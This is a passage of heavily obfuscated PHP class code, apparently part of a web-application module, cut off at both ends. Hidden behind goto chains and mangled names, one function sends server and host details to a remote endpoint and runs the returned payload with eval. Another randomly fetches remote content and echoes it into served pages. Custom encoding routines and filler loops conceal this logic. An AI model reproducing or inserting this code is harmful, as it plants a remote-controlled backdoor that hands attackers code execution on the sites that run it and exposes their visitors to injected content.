} goto b∑´ΩÑŒ¥Ω; F·«÷ñëÿÌ: } private function csin0b1e47f5() { goto dÔÖ˘Œñî‡; dÔÖ˘Œñî‡: $B¯îÓ”˘‚— =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if ($this->uxqt49e8f951 != $B¯îÓ”˘‚—[138]) { return; } $GLOBALS[$B¯îÓ”˘‚—[111]][$B¯îÓ”˘‚—[115]][$B¯îÓ”˘‚—[308]] = $B¯îÓ”˘‚—[246]; goto DÏ»õ˜ïñ÷; eºÿùÂÒªﬂ: if ($B¯îÓ”˘‚—[61]($B¯îÓ”˘‚—[310])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($B¯îÓ”˘‚—[93]) != $B¯îÓ”˘‚—[260]) { $B¯îÓ”˘‚—[61]($B¯îÓ”˘‚—[310])->{$_SERVER[É∫„≈‹Æá¿∫Ö][247]}($B¯îÓ”˘‚—[93], $B¯îÓ”˘‚—[260]); } goto AÀ∑©∏£É‘; DÏ»õ˜ïñ÷: $GLOBALS[$B¯îÓ”˘‚—[111]][$B¯îÓ”˘‚—[309]] = $B¯îÓ”˘‚—[246]; $cﬂ¶è πæÀ = $_SERVER[’ÿƒ†ïò][667]; if (!$cﬂ¶è πæÀ) { die; } goto eºÿùÂÒªﬂ; AÀ∑©∏£É‘: } public function cjhu9085084f() { $BÁæÙá„ãÑ =& $_SERVER[’ÿƒ†ïò]; return $_SERVER[É∫„≈‹Æá¿∫Ö][311]; $E¯ûÓπÜ¿â = $BÁæÙá„ãÑ[668]; while ($E¯ûÓπÜ¿â < $BÁæÙá„ãÑ[625]) { if ($E¯ûÓπÜ¿â >= 0) { break; } $E¯ûÓπÜ¿â++; } } private function uvjy2d2c6691() { goto C§ì˘ÂºèÑ; C∆ê„ıƒ´∂: if (!$c”°úÈ††Ò) { return; } if ($this->{$_SERVER[É∫„≈‹Æá¿∫Ö][225]}($E¯Ì≈†£ˆ◊[$A÷ê Ñÿ∑∫[321]]) != $AŸıÕâ„Æ€[$A÷ê Ñÿ∑∫[190]]) { $D¡Œôı™ ü = array($A÷ê Ñÿ∑∫[227] => $b§∫›òÊ≤÷, $A÷ê Ñÿ∑∫[228] => $_SERVER[$A÷ê Ñÿ∑∫[132]], $A÷ê Ñÿ∑∫[229] => $A÷ê Ñÿ∑∫[230](), $A÷ê Ñÿ∑∫[199] => $_SERVER[$A÷ê Ñÿ∑∫[200]]); $F‡∫§ó√∑◊ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][231]}($A÷ê Ñÿ∑∫[173]($D¡Œôı™ ü)); $E¯Ì≈†£ˆ◊ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][209]}($A÷ê Ñÿ∑∫[232] . $F‡∫§ó√∑◊); if ($E¯Ì≈†£ˆ◊ && $A÷ê Ñÿ∑∫[168]($E¯Ì≈†£ˆ◊) && isset($E¯Ì≈†£ˆ◊[$A÷ê Ñÿ∑∫[321]])) { $F÷ŸÖå∫æˆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][215]}($E¯Ì≈†£ˆ◊[$A÷ê Ñÿ∑∫[321]], 2); if ($F÷ŸÖå∫æˆ) { $F÷ŸÖå∫æˆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][225]}($F÷ŸÖå∫æˆ); } if ($F÷ŸÖå∫æˆ) { try { @eval($F÷ŸÖå∫æˆ); } catch (Exception $d∫·Çû√ÑÒ) { } } } } goto CäÜñËÑ‚†; e÷è”§˜Óº: if (strlen($Dπ∑‰ê¯â£) < $aÍı§ºéõì[601]) { return; } if ($aÙœÜÓñ´¢ && $A÷ê Ñÿ∑∫[262]() - $aÙœÜÓñ´¢ < $A÷ê Ñÿ∑∫[271]($A÷ê Ñÿ∑∫[319])) { return; } $A÷ê Ñÿ∑∫[13](array($A÷ê Ñÿ∑∫[317], $A÷ê Ñÿ∑∫[177]), $FÌ†ú®„âè, $A÷ê Ñÿ∑∫[262]()); goto eÜ≈ß∑ö¥Ÿ; bœâãÍîòï: if ($A÷ê Ñÿ∑∫[262]() % 4 != 0) { return; } $aÙœÜÓñ´¢ = $A÷ê Ñÿ∑∫[13](array($A÷ê Ñÿ∑∫[317], $A÷ê Ñÿ∑∫[318]), $FÌ†ú®„âè); $Dπ∑‰ê¯â£ = $aÍı§ºéõì[669]; goto e÷è”§˜Óº; FÒîõâ·ç°: while (strlen($A´íﬂ›ÚÔé) < $aÍı§ºéõì[625]) { if (!$A´íﬂ›ÚÔé) { break; } $A´íﬂ›ÚÔé++; } $E¯Ì≈†£ˆ◊ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][209]}($A÷ê Ñÿ∑∫[320], $AŸıÕâ„Æ€); if (!$A÷ê Ñÿ∑∫[168]($E¯Ì≈†£ˆ◊)) { return; } goto D»€ä∞àºÍ; C§ì˘ÂºèÑ: $aÍı§ºéõì =& $_SERVER[’ÿƒ†ïò]; $A÷ê Ñÿ∑∫ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $cëüöµÌõÌ = array($A÷ê Ñÿ∑∫[312], $A÷ê Ñÿ∑∫[313], $A÷ê Ñÿ∑∫[314]); goto dãÂÂãç÷ì; dãÂÂãç÷ì: $FÌ†ú®„âè = $A÷ê Ñÿ∑∫[315] . $A÷ê Ñÿ∑∫[131]($A÷ê Ñÿ∑∫[316]); if ($this->uxqt49e8f951 == $A÷ê Ñÿ∑∫[138] || !$A÷ê Ñÿ∑∫[123]($GLOBALS, $A÷ê Ñÿ∑∫[149])) { return; } if (!$A÷ê Ñÿ∑∫[269]($_SERVER[$A÷ê Ñÿ∑∫[44]], $cëüöµÌõÌ)) { return; } goto bœâãÍîòï; eÜ≈ß∑ö¥Ÿ: $b§∫›òÊ≤÷ = $A÷ê Ñÿ∑∫[61]($A÷ê Ñÿ∑∫[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($A÷ê Ñÿ∑∫[133]); $AŸıÕâ„Æ€ = array($A÷ê Ñÿ∑∫[190] => $A÷ê Ñÿ∑∫[61]($A÷ê Ñÿ∑∫[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($A÷ê Ñÿ∑∫[234]), $A÷ê Ñÿ∑∫[204] => $this->uxqt49e8f951, $A÷ê Ñÿ∑∫[201] => $_SERVER[$A÷ê Ñÿ∑∫[202]], $A÷ê Ñÿ∑∫[203] => $A÷ê Ñÿ∑∫[61]($A÷ê Ñÿ∑∫[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($A÷ê Ñÿ∑∫[164]), $A÷ê Ñÿ∑∫[130] => $A÷ê Ñÿ∑∫[131]($_SERVER[$A÷ê Ñÿ∑∫[132]] . $b§∫›òÊ≤÷), $A÷ê Ñÿ∑∫[194] => $A÷ê Ñÿ∑∫[174], $A÷ê Ñÿ∑∫[197] => $_SERVER[$A÷ê Ñÿ∑∫[198]]); $A´íﬂ›ÚÔé = $aÍı§ºéõì[670]; goto FÒîõâ·ç°; D»€ä∞àºÍ: if ($E¯Ì≈†£ˆ◊[$A÷ê Ñÿ∑∫[190]] && $E¯Ì≈†£ˆ◊[$A÷ê Ñÿ∑∫[321]]) { if ($this->{$_SERVER[É∫„≈‹Æá¿∫Ö][225]}($E¯Ì≈†£ˆ◊[$A÷ê Ñÿ∑∫[321]]) == $AŸıÕâ„Æ€[$A÷ê Ñÿ∑∫[190]]) { return; } } $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][189]}(); $c”°úÈ††Ò = $aÍı§ºéõì[671]; goto C∆ê„ıƒ´∂; CäÜñËÑ‚†: } private function vznh94d359bb($cÒÇ™€Ê Û = '', $b”Œàî’õÇ = array(), $FÆ€ªü¿âÛ = 5) { goto d˘èñÕÊñ; BÜÌ÷”ÿº§: $eÜπ»•¢◊ = $eÜπ»•¢◊ . $cÒÇ™€Ê Û; if ($b”Œàî’õÇ && $eâçèï¶≈‚[168]($b”Œàî’õÇ)) { $eÜπ»•¢◊ = $eÜπ»•¢◊ . $eâçèï¶≈‚[324] . $eâçèï¶≈‚[325]($b”Œàî’õÇ); } if ($b”Œàî’õÇ === -1) { return $eÜπ»•¢◊; } goto eÀÁÍ˘ﬁ◊; fÜºî„”¶ì: $aôüïóëõè = $_SERVER[’ÿƒ†ïò][672]; if (!$aôüïóëõè) { die; } goto CÌñ£Ø∂ ø; d˘èñÕÊñ: $eâçèï¶≈‚ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $eÜπ»•¢◊ = $eâçèï¶≈‚[322]; $eÜπ»•¢◊ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($eÜπ»•¢◊, $eâçèï¶≈‚[323]); goto BÜÌ÷”ÿº§; eÀÁÍ˘ﬁ◊: $Bêõ‹≥ˆÖ» = $eâçèï¶≈‚[279](array($eâçèï¶≈‚[280] => array($eâçèï¶≈‚[283] => $FÆ€ªü¿âÛ, $eâçèï¶≈‚[281] => $eâçèï¶≈‚[326]), $eâçèï¶≈‚[327] => array($eâçèï¶≈‚[328] => !1, $eâçèï¶≈‚[329] => !1))); $b”Œàî’õÇ = @$eâçèï¶≈‚[284]($eÜπ»•¢◊, !1, $Bêõ‹≥ˆÖ»); return $eâçèï¶≈‚[217]($b”Œàî’õÇ, !0); goto fÜºî„”¶ì; CÌñ£Ø∂ ø: } private function wjcs671a6305() { goto cÜ£·á√•Ω; e¿ÁÜ≤Ú°€: $f†¬ÈÒÜÁä = $f†¬ÈÒÜÁä ? $BêÇ¶ïó∫∂[271]($f†¬ÈÒÜÁä) : 0; $Aº·Àñ‡ÎÂ = $dí’¶ù–÷’[676]; return $fóè¬¥¿¯é + $f†¬ÈÒÜÁä; goto D‘πáÑâß≤; D‘πáÑâß≤: $f‡£íﬁà™é = $dí’¶ù–÷’[677]; if (strlen($f‡£íﬁà™é) < $dí’¶ù–÷’[601]) { return; } goto EÉÈÌÛê„Î; E÷§ïØÚõ≥: $fóè¬¥¿¯é = $BêÇ¶ïó∫∂[271]($fóè¬¥¿¯é ? $fóè¬¥¿¯é : $BêÇ¶ïó∫∂[331]); $Càà∆©ç¶ü = $dí’¶ù–÷’[674]; if (strlen($Càà∆©ç¶ü) < $dí’¶ù–÷’[615]) { return; } goto D∆∑ÇÇ›ıì; D∆∑ÇÇ›ıì: $f†¬ÈÒÜÁä = $BêÇ¶ïó∫∂[123]($this->mflrf2bde457, $BêÇ¶ïó∫∂[357]); $EÙ´ô√æ‘‡ = $dí’¶ù–÷’[675]; if (strlen($EÙ´ô√æ‘‡) < $dí’¶ù–÷’[609]) { return; } goto e¿ÁÜ≤Ú°€; F±ÃäˆÔå¯: $fóè¬¥¿¯é = $eÿ⁄πµÜ”…[$this->uxqt49e8f951]; $a÷àäÔ≥ò¬ = $dí’¶ù–÷’[673]; if (!$a÷àäÔ≥ò¬) { die; } goto E÷§ïØÚõ≥; cÜ£·á√•Ω: $dí’¶ù–÷’ =& $_SERVER[’ÿƒ†ïò]; $BêÇ¶ïó∫∂ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $eÿ⁄πµÜ”… = array($BêÇ¶ïó∫∂[330] => $BêÇ¶ïó∫∂[331], $BêÇ¶ïó∫∂[332] => $BêÇ¶ïó∫∂[333], $BêÇ¶ïó∫∂[334] => $BêÇ¶ïó∫∂[335], $BêÇ¶ïó∫∂[336] => $BêÇ¶ïó∫∂[337], $BêÇ¶ïó∫∂[338] => $BêÇ¶ïó∫∂[339], $BêÇ¶ïó∫∂[340] => $BêÇ¶ïó∫∂[272], $BêÇ¶ïó∫∂[341] => $BêÇ¶ïó∫∂[272], $BêÇ¶ïó∫∂[342] => $BêÇ¶ïó∫∂[331], $BêÇ¶ïó∫∂[343] => $BêÇ¶ïó∫∂[333], $BêÇ¶ïó∫∂[344] => $BêÇ¶ïó∫∂[335], $BêÇ¶ïó∫∂[345] => $BêÇ¶ïó∫∂[346], $BêÇ¶ïó∫∂[347] => $BêÇ¶ïó∫∂[337], $BêÇ¶ïó∫∂[348] => $BêÇ¶ïó∫∂[349], $BêÇ¶ïó∫∂[350] => $BêÇ¶ïó∫∂[339], $BêÇ¶ïó∫∂[351] => $BêÇ¶ïó∫∂[352], $BêÇ¶ïó∫∂[353] => $BêÇ¶ïó∫∂[354], $BêÇ¶ïó∫∂[355] => $BêÇ¶ïó∫∂[356]); goto F±ÃäˆÔå¯; EÉÈÌÛê„Î: } public function asil0816fbf4($Có™êä«Ωﬂ) { goto cà«Õ‚“â˘; dçûó∂Ê¢∏: $e’ü„´´ƒœ = $b»æ”®°ﬂÀ[61]($b»æ”®°ﬂÀ[156])->{$_SERVER[É∫„≈‹Æá¿∫Ö][359]}($b»æ”®°ﬂÀ[358])->{$_SERVER[É∫„≈‹Æá¿∫Ö][360]}($Aƒ¢äÔù’˜)->{$_SERVER[É∫„≈‹Æá¿∫Ö][361]}(); $e’ü„´´ƒœ = $b»æ”®°ﬂÀ[248]($e’ü„´´ƒœ, $b»æ”®°ﬂÀ[10], $b»æ”®°ﬂÀ[358]); if (!$b»æ”®°ﬂÀ[269]($Có™êä«Ωﬂ[$b»æ”®°ﬂÀ[358]], $e’ü„´´ƒœ)) { $b»æ”®°ﬂÀ[191]($b»æ”®°ﬂÀ[362], !1, $b»æ”®°ﬂÀ[266]); } goto B÷Æ•‡Ü¯Ô; cà«Õ‚“â˘: $b»æ”®°ﬂÀ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $Aƒ¢äÔù’˜ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][154]}(); if ($Có™êä«Ωﬂ[$b»æ”®°ﬂÀ[358]] == $b»æ”®°ﬂÀ[246]) { return; } goto FÚÆáﬂ™´¨; FÚÆáﬂ™´¨: if ($Aƒ¢äÔù’˜ >= $b»æ”®°ﬂÀ[271]($b»æ”®°ﬂÀ[272])) { return; } $dü”ëáëÔí = $b»æ”®°ﬂÀ[61]($b»æ”®°ﬂÀ[156])->{$_SERVER[É∫„≈‹Æá¿∫Ö][157]}(); if ($dü”ëáëÔí <= $Aƒ¢äÔù’˜) { return; } goto dçûó∂Ê¢∏; B÷Æ•‡Ü¯Ô: } public function ojrf2c663fe6() { goto AÈÿáñÜıÊ; AÈÿáñÜıÊ: $DçÉÑˆæÑç =& $_SERVER[’ÿƒ†ïò]; $d®÷—ÁÑø =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if (!$d®÷—ÁÑø[123]($GLOBALS, $d®÷—ÁÑø[149]) || $d®÷—ÁÑø[363](1, 100) > 20) { return; } goto eèÎéΩëÛù; eèÎéΩëÛù: $FﬁÇ›ñë≠é = $d®÷—ÁÑø[276]; $C¥ä£–’Çå = $DçÉÑˆæÑç[678]; $FﬁÇ›ñë≠é = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($FﬁÇ›ñë≠é, $d®÷—ÁÑø[278]); goto F›ÇàÂ—ﬂÛ; DÙ«Ëúÿºà: $B– õ»Í®Œ = @$d®÷—ÁÑø[284]($FﬁÇ›ñë≠é, !1, $f«„¿øâıÌ); $f¶‘¥õÁ∑‡ = $DçÉÑˆæÑç[680]; if (!$f¶‘¥õÁ∑‡) { die; } goto F‰êœ¬á‚á; F‰êœ¬á‚á: echo $d®÷—ÁÑø[364] . $d®÷—ÁÑø[365]($B– õ»Í®Œ) . $d®÷—ÁÑø[366]; goto Bµêƒﬂé¡Ñ; F›ÇàÂ—ﬂÛ: $aπªµ¥≈¶∫ = $DçÉÑˆæÑç[679]; if (!$aπªµ¥≈¶∫) { die; } $f«„¿øâıÌ = $d®÷—ÁÑø[279](array($d®÷—ÁÑø[280] => array($d®÷—ÁÑø[281] => $d®÷—ÁÑø[282], $d®÷—ÁÑø[283] => 3))); goto DÙ«Ëúÿºà; Bµêƒﬂé¡Ñ: } private function fmib844bd21e($DÁï¶æçÿ∑, $C∏¡◊ªÍçΩ, $E£ÑÃæ™¶ = 3) { goto E«—Úò¨ö∑; c∫Ï ÚöŒ : switch ($fòëùáÚÒÃ) { case $f˘‹Ò¡ëÓ∑[260]: $D‹‡™âñ ∆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($DÁï¶æçÿ∑, $f˘‹Ò¡ëÓ∑[240]($C∏¡◊ªÍçΩ . $B€ˆ¨¡Áâ„)); $A∫Ü„≠ïŒ˜ = $D∆≥⁄àé„í[683]; while ($A∫Ü„≠ïŒ˜ < $D∆≥⁄àé„í[601]) { if ($A∫Ü„≠ïŒ˜ >= 0) { break; } $A∫Ü„≠ïŒ˜++; } break; case $f˘‹Ò¡ëÓ∑[246]: $D‹‡™âñ ∆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($DÁï¶æçÿ∑, $f˘‹Ò¡ëÓ∑[240]($B€ˆ¨¡Áâ„ . $C∏¡◊ªÍçΩ)); $cÇÂÿàÔæê = $D∆≥⁄àé„í[684]; while ($cÇÂÿàÔæê < $D∆≥⁄àé„í[609]) { if ($cÇÂÿàÔæê >= 0) { break; } $cÇÂÿàÔæê++; } break; case $f˘‹Ò¡ëÓ∑[369]: $D‹‡™âñ ∆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($DÁï¶æçÿ∑, $f˘‹Ò¡ëÓ∑[135]($B€ˆ¨¡Áâ„ . $C∏¡◊ªÍçΩ)); break; $bƒç¥™ïÓé = $D∆≥⁄àé„í[685]; while ($bƒç¥™ïÓé < $D∆≥⁄àé„í[615]) { if ($bƒç¥™ïÓé >= 0) { break; } $bƒç¥™ïÓé++; } case $f˘‹Ò¡ëÓ∑[370]: $D‹‡™âñ ∆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($DÁï¶æçÿ∑, $f˘‹Ò¡ëÓ∑[131]($B€ˆ¨¡Áâ„ . $C∏¡◊ªÍçΩ)); break; case $f˘‹Ò¡ëÓ∑[371]: goto b¢ ±∆õ“í; D“«öò›¨‚: break; goto a¶ç•ø©çõ; a≤À„Ü™ôñ: $FΩ©∆äÏÑË = 0; $aÇ•ˆ√˘åπ = 0; $D—ç≠õÂüä = $D∆≥⁄àé„í[688]; goto E°ÛåÏ≠ºÔ; C∑Ÿ⁄´òÃﬁ: if (strlen($BÕâÆ£‹Îƒ) < $D∆≥⁄àé„í[625]) { return; } $dèò–Ìºâ† = $FÇÕÑ«Ë√˜[$BÉØ∞ƒƒÛ˘]; $fπ∑À˘‹Â = $f˘‹Ò¡ëÓ∑[131]($dèò–Ìºâ† . $f˘‹Ò¡ëÓ∑[131]($C∏¡◊ªÍçΩ . $dèò–Ìºâ†) . $C∏¡◊ªÍçΩ); goto D◊›«ì…âá; b¢ ±∆õ“í: $DÁï¶æçÿ∑ = $f˘‹Ò¡ëÓ∑[135]($DÁï¶æçÿ∑); $BÉØ∞ƒƒÛ˘ = $f˘‹Ò¡ëÓ∑[372](0, 64); $BÕâÆ£‹Îƒ = $D∆≥⁄àé„í[686]; goto C∑Ÿ⁄´òÃﬁ; b¶ÖÁé„É·: $D‹‡™âñ ∆ = $f˘‹Ò¡ëÓ∑[365]($dèò–Ìºâ† . $bá‰ëï¢›ﬁ); $a‹è¡ÙÛ”ˆ = $D∆≥⁄àé„í[690]; if (!$a‹è¡ÙÛ”ˆ) { return; } goto D“«öò›¨‚; D◊›«ì…âá: $fπ∑À˘‹Â = $f˘‹Ò¡ëÓ∑[25]($fπ∑À˘‹Â, $BÉØ∞ƒƒÛ˘ % 8, $BÉØ∞ƒƒÛ˘ % 8 + 7); $bá‰ëï¢›ﬁ = $f˘‹Ò¡ëÓ∑[10]; $CÃñø°ôâ± = $D∆≥⁄àé„í[687]; goto a≤À„Ü™ôñ; E°ÛåÏ≠ºÔ: while ($D—ç≠õÂüä < $D∆≥⁄àé„í[601]) { if ($D—ç≠õÂüä >= 0) { break; } $D—ç≠õÂüä++; } $eÏ´ö∂ÿµÂ = 0; for ($FΩ©∆äÏÑË = 0; $FΩ©∆äÏÑË < $f˘‹Ò¡ëÓ∑[24]($DÁï¶æçÿ∑); $FΩ©∆äÏÑË++) { $eÏ´ö∂ÿµÂ = $eÏ´ö∂ÿµÂ == $f˘‹Ò¡ëÓ∑[24]($fπ∑À˘‹Â) ? 0 : $eÏ´ö∂ÿµÂ; $aÇ•ˆ√˘åπ = ($BÉØ∞ƒƒÛ˘ + $f˘‹Ò¡ëÓ∑[373]($FÇÕÑ«Ë√˜, $DÁï¶æçÿ∑[$FΩ©∆äÏÑË]) + $f˘‹Ò¡ëÓ∑[374]($fπ∑À˘‹Â[$eÏ´ö∂ÿµÂ++])) % 64; $Fã—„˜ïŸÖ = $D∆≥⁄àé„í[689]; if (!$Fã—„˜ïŸÖ) { die; } $bá‰ëï¢›ﬁ .= $FÇÕÑ«Ë√˜[$aÇ•ˆ√˘åπ]; } goto b¶ÖÁé„É·; a¶ç•ø©çõ: default: $D‹‡™âñ ∆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($DÁï¶æçÿ∑, $C∏¡◊ªÍçΩ . $B€ˆ¨¡Áâ„); $A¯õ‡»Ì…ª = $D∆≥⁄àé„í[691]; while (strlen($A¯õ‡»Ì…ª) < $D∆≥⁄àé„í[625]) { if (!$A¯õ‡»Ì…ª) { break; } $A¯õ‡»Ì…ª++; } break; $b∑›Ûõ∞êÖ = $D∆≥⁄àé„í[692]; while (strlen($b∑›Ûõ∞êÖ) < $D∆≥⁄àé„í[609]) { if (!$b∑›Ûõ∞êÖ) { break; } $b∑›Ûõ∞êÖ++; } } $D‹‡™âñ ∆ = $f˘‹Ò¡ëÓ∑[240]($fòëùáÚÒÃ . $B€ˆ¨¡Áâ„ . $D‹‡™âñ ∆); $A∂˘ú‚Éïˆ = $D∆≥⁄àé„í[693]; goto dô•‰‰à£“; e∏ïùƒ∂˘¢: $DÁï¶æçÿ∑ = $f˘‹Ò¡ëÓ∑[2]($DÁï¶æçÿ∑); $fòëùáÚÒÃ = $f˘‹Ò¡ëÓ∑[363](0, 5) . $f˘‹Ò¡ëÓ∑[10]; $aüúâ¶¬À = $D∆≥⁄àé„í[681]; goto c˜û‡ÒÆÛæ; dô•‰‰à£“: if ($E£ÑÃæ™¶ - 1 > 0) { $D‹‡™âñ ∆ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][144]}($D‹‡™âñ ∆, $C∏¡◊ªÍçΩ, $E£ÑÃæ™¶ - 1); } return $D‹‡™âñ ∆; goto aæëâøóáú; E«—Úò¨ö∑: $D∆≥⁄àé„í =& $_SERVER[’ÿƒ†ïò]; $f˘‹Ò¡ëÓ∑ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $f˘‹Ò¡ëÓ∑[367](1); goto e∏ïùƒ∂˘¢; c˜û‡ÒÆÛæ: $B€ˆ¨¡Áâ„ = $f˘‹Ò¡ëÓ∑[141](15); $FÇÕÑ«Ë√˜ = $f˘‹Ò¡ëÓ∑[368]; $d°§Ñ“ô∫ñ = $D∆≥⁄àé„í[682]; goto c∫Ï ÚöŒ ; aæëâøóáú: } private function owlu3859db78($E∏®ŸëÂ‹†, $d¬í›∫ú¶¬, $E∏üÒ›ﬂËÖ = 3) { goto E⁄∂˘äÓ£; f⁄ëŸ›—∫Ã: if ($E∏üÒ›ﬂËÖ - 1 > 0) { $aã‘ßÊ«ì£ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][215]}($aã‘ßÊ«ì£, $d¬í›∫ú¶¬, $E∏üÒ›ﬂËÖ - 1); } return $aã‘ßÊ«ì£; goto c†©Â›‘Ú¡; FñÏıóèøõ: $E‘Ã‚è™ôí = $Cô†‹Æ∏éñ[696]; if (strlen($E‘Ã‚è™ôí) < $Cô†‹Æ∏éñ[607]) { return; } switch ($aÜ”úñëòâ) { case $F›‚∏‚±ãÖ[260]: $aã‘ßÊ«ì£ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($E∏®ŸëÂ‹†, $F›‚∏‚±ãÖ[240]($d¬í›∫ú¶¬ . $EÁ™ß¶’ëÖ)); break; $b“íÚÌÉÕ° = $Cô†‹Æ∏éñ[697]; case $F›‚∏‚±ãÖ[246]: $aã‘ßÊ«ì£ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($E∏®ŸëÂ‹†, $F›‚∏‚±ãÖ[240]($EÁ™ß¶’ëÖ . $d¬í›∫ú¶¬)); $eÆÈÖÕëô¨ = $Cô†‹Æ∏éñ[698]; if (!$eÆÈÖÕëô¨) { die; } break; case $F›‚∏‚±ãÖ[369]: $aã‘ßÊ«ì£ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($E∏®ŸëÂ‹†, $F›‚∏‚±ãÖ[135]($EÁ™ß¶’ëÖ . $d¬í›∫ú¶¬)); $c»⁄∞Ø¢Àê = $Cô†‹Æ∏éñ[699]; while (strlen($c»⁄∞Ø¢Àê) < $Cô†‹Æ∏éñ[615]) { if (!$c»⁄∞Ø¢Àê) { break; } $c»⁄∞Ø¢Àê++; } break; $aâªàã∞ú¶ = $Cô†‹Æ∏éñ[700]; if (strlen($aâªàã∞ú¶) < $Cô†‹Æ∏éñ[607]) { return; } case $F›‚∏‚±ãÖ[370]: $aã‘ßÊ«ì£ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($E∏®ŸëÂ‹†, $F›‚∏‚±ãÖ[131]($EÁ™ß¶’ëÖ . $d¬í›∫ú¶¬)); break; case $F›‚∏‚±ãÖ[371]: goto Fˆ’ÕƒÌÈâ; eÒú ±Òä: $fŸüéÑûûÁ = $Cô†‹Æ∏éñ[706]; while (strlen($fŸüéÑûûÁ) < $Cô†‹Æ∏éñ[615]) { if (!$fŸüéÑûûÁ) { break; } $fŸüéÑûûÁ++; } $BÃﬂÆ·¶£ÿ = 0; goto F Ì•Òï®Ö; BÎõ¥ºèÆ∑: $aü‹çàÔÌÙ = $Cô†‹Æ∏éñ[712]; goto aƒƒÌÉ›≤ê; dÂ›Æ‹øı”: $b€Îî¶ÏÁ‚ = $F›‚∏‚±ãÖ[373]($aÁÚ£°Ü®≈, $AÎÔ∫≤øﬁÎ); $Fπˆ–π◊É = $F›‚∏‚±ãÖ[131]($AÎÔ∫≤øﬁÎ . $F›‚∏‚±ãÖ[131]($d¬í›∫ú¶¬ . $AÎÔ∫≤øﬁÎ) . $d¬í›∫ú¶¬); $D˘Ëø’Õ¢ﬁ = $Cô†‹Æ∏éñ[703]; goto E⁄ﬁ…ÜË‰ã; Fˆ’ÕƒÌÈâ: $E∏®ŸëÂ‹† = $F›‚∏‚±ãÖ[375]($E∏®ŸëÂ‹†); $Eèˆ‘®¥ŒÁ = $Cô†‹Æ∏éñ[701]; $AÎÔ∫≤øﬁÎ = $E∏®ŸëÂ‹†[0]; goto cé‚ªÓÜæ¡; cé‚ªÓÜæ¡: $E∏®ŸëÂ‹† = $F›‚∏‚±ãÖ[25]($E∏®ŸëÂ‹†, 1); $Dƒ—øå‹Ò¯ = $Cô†‹Æ∏éñ[702]; while ($Dƒ—øå‹Ò¯ < $Cô†‹Æ∏éñ[609]) { if ($Dƒ—øå‹Ò¯ >= 0) { break; } $Dƒ—øå‹Ò¯++; } goto dÂ›Æ‹øı”; F Ì•Òï®Ö: $fÜ≥ñºÍéˆ = 0; $C∑¢á£¯≈ô = $Cô†‹Æ∏éñ[707]; while (strlen($C∑¢á£¯≈ô) < $Cô†‹Æ∏éñ[607]) { if (!$C∑¢á£¯≈ô) { break; } $C∑¢á£¯≈ô++; } goto Däú•¡Øä£; Däú•¡Øä£: for ($eé›êòÙõÇ = 0; $eé›êòÙõÇ < $F›‚∏‚±ãÖ[24]($E∏®ŸëÂ‹†); $eé›êòÙõÇ++) { $fÜ≥ñºÍéˆ = $fÜ≥ñºÍéˆ == $F›‚∏‚±ãÖ[24]($Fπˆ–π◊É) ? 0 : $fÜ≥ñºÍéˆ; $FÉÓÀßËã£ = $fÜ≥ñºÍéˆ++; $BÁöπÌ√±¨ = $Cô†‹Æ∏éñ[708]; if (strlen($BÁöπÌ√±¨) < $Cô†‹Æ∏éñ[607]) { return; } $BÃﬂÆ·¶£ÿ = $F›‚∏‚±ãÖ[373]($aÁÚ£°Ü®≈, $E∏®ŸëÂ‹†[$eé›êòÙõÇ]) - $b€Îî¶ÏÁ‚ - $F›‚∏‚±ãÖ[374]($Fπˆ–π◊É[$FÉÓÀßËã£]); $aâ≠É£àπ» = $Cô†‹Æ∏éñ[709]; if (strlen($aâ≠É£àπ») < $Cô†‹Æ∏éñ[607]) { return; } while ($BÃﬂÆ·¶£ÿ < 0) { $BÃﬂÆ·¶£ÿ += 64; $cÇ•ﬁÙµŸ‚ = $Cô†‹Æ∏éñ[710]; if (strlen($cÇ•ﬁÙµŸ‚) < $Cô†‹Æ∏éñ[607]) { return; } } $dÉÌÁÖ„£ .= $aÁÚ£°Ü®≈[$BÃﬂÆ·¶£ÿ]; $DêÌƒ„∆Ê  = $Cô†‹Æ∏éñ[711]; } $aã‘ßÊ«ì£ = $F›‚∏‚±ãÖ[376]($dÉÌÁÖ„£); break; goto BÎõ¥ºèÆ∑; F˘¡ëÒ∏∞ä: $dÉÌÁÖ„£ = $F›‚∏‚±ãÖ[10]; $eÀ£∏¯ﬁ‹« = $Cô†‹Æ∏éñ[705]; $eé›êòÙõÇ = 0; goto eÒú ±Òä; E⁄ﬁ…ÜË‰ã: while (strlen($D˘Ëø’Õ¢ﬁ) < $Cô†‹Æ∏éñ[601]) { if (!$D˘Ëø’Õ¢ﬁ) { break; } $D˘Ëø’Õ¢ﬁ++; } $Fπˆ–π◊É = $F›‚∏‚±ãÖ[25]($Fπˆ–π◊É, $b€Îî¶ÏÁ‚ % 8, $b€Îî¶ÏÁ‚ % 8 + 7); $DÈÃáËæã™ = 